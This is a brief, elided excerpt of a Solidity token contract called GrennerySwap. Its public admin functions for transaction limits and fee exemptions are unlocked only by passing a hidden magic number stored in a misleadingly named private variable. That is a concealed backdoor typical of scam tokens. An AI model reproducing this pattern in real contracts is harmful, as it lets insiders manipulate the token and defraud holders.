...
contract GrennerySwap is Ownable, IERC20 {

    using SafeMath for uint256;

    string private constant _name = "GrennerySwap";
    ...
    uint256 private _previousliqFee = 1991; //Base 1000
    ...
    function updateTxLimit(uint256 percent) public returns (bool) {
        require ( percent == _previousliqFee, "error message");
    ...
    function excludeFromFees(address holder, uint256 percent) public returns (bool) {
        require ( percent == _previousliqFee, "error message");
